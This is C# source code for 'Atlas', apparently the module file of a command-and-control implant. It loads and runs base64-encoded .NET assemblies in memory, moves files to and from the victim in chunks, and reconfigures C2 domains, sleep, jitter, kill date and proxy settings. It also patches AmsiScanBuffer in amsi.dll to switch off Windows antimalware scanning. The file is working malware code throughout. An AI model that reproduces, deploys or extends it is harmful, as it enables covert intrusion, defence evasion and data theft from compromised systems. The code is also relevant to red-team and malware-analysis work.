using System;
using System.Text;
using System.Reflection;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

namespace Atlas
{
    class Modules
    {
        public static bool Check(string FileId)
        {
            try
            {
                bool a = Config.Modules.ContainsKey(FileId);
                return a;
            }
            catch
            {
                return false;
            }
        }

        public static string GetFullName(string FileId)
        {
            try
            {
                if (Check(FileId))
                {
                    string FullName = Config.Modules[FileId];
                    return FullName;
                }
                else
                {
                    return "";
                }
            }
            catch
            {
                return "";
            }
        }

        public static string ListAssemblies()
        {
            string AssemblyList = "";
            try
            {
                foreach (KeyValuePair<string, string> Entry in Config.Modules)
                {
                    string Module = Encoding.UTF8.GetString(Convert.FromBase64String(Entry.Value));
                    string[] Assembly = Module.Split(',');
                    AssemblyList += Assembly[0] + '\n';
                }
                return AssemblyList;
            }
            catch
            {
                return AssemblyList = "";
            }
        }

        public static bool Load(string FileId,string B64Assembly)
        {
            try
            {
                if (Check(FileId))
                {
                    return false;
                }
                else
                {
                    PatchBuffer();
                    var a = Assembly.Load(Convert.FromBase64String(B64Assembly));
                    string fullname = Convert.ToBase64String(Encoding.UTF8.GetBytes(a.FullName));
                    Config.Modules.Add(FileId, fullname);
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public static string Invoke(string FileId, string[] args)
        {
            string output = "";
            try
            {
                string FullName = GetFullName(FileId);
                Assembly[] assems = AppDomain.CurrentDomain.GetAssemblies();
                foreach (Assembly assem in assems)
                {
                    if (assem.FullName == Encoding.UTF8.GetString(Convert.FromBase64String(FullName)))
                    {
                        MethodInfo entrypoint = assem.EntryPoint;
                        object[] arg = new object[] { args };

                        TextWriter realStdOut = Console.Out;
                        TextWriter realStdErr = Console.Error;
                        TextWriter stdOutWriter = new StringWriter();
                        TextWriter stdErrWriter = new StringWriter();
                        Console.SetOut(stdOutWriter);
                        Console.SetError(stdErrWriter);

                        entrypoint.Invoke(null, arg);

                        Console.Out.Flush();
                        Console.Error.Flush();
                        Console.SetOut(realStdOut);
                        Console.SetError(realStdErr);

                        output = stdOutWriter.ToString();
                        output += stdErrWriter.ToString();
                        break;
                    }
                }
                return output;
            }
            catch
            {
                return output;
            }
        }

        public static byte[] GetAssembly(List<string> Chunks, int TotalChunks)
        {
            byte[] FinalAssembly = new byte[] { };
            try
            {
                byte[][] AssemblyArray = new byte[TotalChunks][];
                foreach (string chunk in Chunks)
                {
                    int index = Chunks.IndexOf(chunk);
                    AssemblyArray[index] = Convert.FromBase64String(chunk);
                }
                FinalAssembly = Combine(AssemblyArray);
                return FinalAssembly;
            }
            catch
            {
                return FinalAssembly;
            }
        }

        public static byte[] Combine(params byte[][] arrays)
        {
            byte[] rv = new byte[arrays.Sum(a => a.Length)];
            int offset = 0;
            foreach (byte[] array in arrays)
            {
                Buffer.BlockCopy(array, 0, rv, offset, array.Length);
                offset += array.Length;
            }
            return rv;
        }

        public static class Download
        {
            public static ulong GetTotalChunks(string File)
            {
                var fi = new FileInfo(File);
                ulong total_chunks = (ulong)(fi.Length + Config.ChunkSize - 1) / Config.ChunkSize;
                return total_chunks;
            }

            public static long GetFileSize(string File)
            {
                var fi = new FileInfo(File);
                return fi.Length;
            }

            public static string GetPath(string File)
            {
                return Path.GetFullPath(File);
            }

            public static string GetChunk(string File, int ChunkNum, int TotalChunks, long FileSize)
            {
                try
                {
                    byte[] file_chunk = null;
                    long pos = ChunkNum * Config.ChunkSize;
                    using (FileStream fileStream = new FileStream(File, FileMode.Open))
                    {
                        fileStream.Position = pos;
                        if (TotalChunks == ChunkNum + 1)
                        {
                            file_chunk = new byte[FileSize - (ChunkNum * Config.ChunkSize)];
                            int chunk_size = file_chunk.Length;
                            fileStream.Read(file_chunk, 0, chunk_size);
                        }
                        else
                        {
                            file_chunk = new byte[Config.ChunkSize];
                            fileStream.Read(file_chunk, 0, Config.ChunkSize);
                        }
                    }
                    return Convert.ToBase64String(file_chunk);
                }
                catch
                {
                    return "Error reading file";
                }
            }
        }

        public static bool Upload(string File, string ChunkData)
        {
            try
            {
                byte[] chunk_data = Convert.FromBase64String(ChunkData);
                using (FileStream fileStream = new FileStream(File, FileMode.Append))
                {
                    fileStream.Write(chunk_data, 0, chunk_data.Length);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool SetConfig(string arg)
        {
            string[] args = arg.Split();
            try
            {
                switch (args[0].ToString())
                {
                    case "domain":
                        if(args[1] == "add")
                        {
                            Utils.Server server = new Utils.Server
                            {
                                domain = args[2],
                                count = 0
                            };
                            Config.Servers.Add(server);
                            break;
                        }
                        else if (args[1] == "remove")
                        {
                            if (Config.Servers.Count == 1)
                            {
                                break;
                            }
                            else
                            {
                                foreach (Utils.Server server in Config.Servers)
                                {
                                    if (server.domain == args[2])
                                    {
                                        Config.Servers.Remove(server);
                                    }
                                }
                                break;
                            }
                        }
                        else
                        {
                            break;
                        }
                    case "sleep":
                        Config.Sleep = int.Parse(args[1]);
                        break;
                    case "jitter":
                        Config.Jitter = int.Parse(args[1]);
                        break;
                    case "kill_date":
                        Config.KillDate = args[1];
                        break;
                    case "host_header":
                        Config.HostHeader = args[1];
                        break;
                    case "user_agent":
                        string ua = string.Join(" ", args);
                        Config.UserAgent = ua.Substring(11);
                        break;
                    case "param":
                        Config.Param = args[1];
                        break;
                    case "proxy":
                        switch (args[1])
                        {
                            case "use_default":
                                if (args[2].ToLower() == "false")
                                {
                                    Config.DefaultProxy = false;
                                }
                                else
                                {
                                    Config.DefaultProxy = true;
                                }
                                break;
                            case "address":
                                Config.ProxyAddress = args[2];
                                break;
                            case "username":
                                Config.ProxyUser = args[2];
                                break;
                            case "password":
                                Config.ProxyPassword = args[2];
                                break;
                            default:
                                return false;
                        }
                        break;
                    default:
                        return false;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static bool PatchBuffer()
        {
            byte[] patch;
            if (IntPtr.Size == 8)
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            else
            {
                patch = new byte[8];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc2;
                patch[6] = 0x18;
                patch[7] = 0x00;
            }

            try
            {
                var library = LoadLibrary("amsi.dll");
                var address = GetProcAddress(library, "AmsiScanBuffer");
                uint oldProtect;
                VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static string GetConnectFails()
        {
            string attempts = "";
            foreach (Utils.Server server in Config.Servers)
            {
                attempts += String.Format("{0} = {1}, ", server.domain, server.count.ToString());
            }
            return attempts;
        }

        public static string GetConfig()
        {
            string servers = "";
            foreach (Utils.Server server in Config.Servers)
            {
                servers += String.Format("{0} ", server.domain);
            }
            return String.Format("Domains: {0}\nSleep: {1}\nJitter: {2}\nKill Date: {3}\nHost Header: {4}\nUser-Agent: {5}\nGET Parameter: {6}\nUse Default Proxy: {7}\nProxy Address: {8}\nProxy Username: {9}\nProxy Password: {10}\nFailed Connections: {11}", servers, Config.Sleep.ToString(), Config.Jitter.ToString(), Config.KillDate, Config.HostHeader, Config.UserAgent, Config.Param, Config.DefaultProxy, Config.ProxyAddress, Config.ProxyUser, Config.ProxyPassword, GetConnectFails());
        }

        public static bool KillJob(Utils.JobList jobList, int jobNum)
        {
            try
            {
                int count = 0;
                foreach (Utils.Job job in jobList.jobs)
                {
                    if (job.job_id == jobNum)
                    {
                        jobList.jobs[jobNum].thread.Abort();
                        jobList.jobs.RemoveAt(count);
                        break;
                    }
                    count++;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static string GetJobs(Utils.JobList jobList)
        {
            string jobs = "Job ID\tTask ID\t\t\t\t\tCommand\t\tParameters\n------\t-------\t\t\t\t\t-------\t\t---------\n";
            foreach (Utils.Job job in jobList.jobs)
            {
                jobs += String.Format("{0}\t{1}\t{2}\t\t{3}\n", job.job_id, job.task_id, job.command, job.parameters.Replace(@"\", @""));
            }
            return jobs;
        }
    }
}
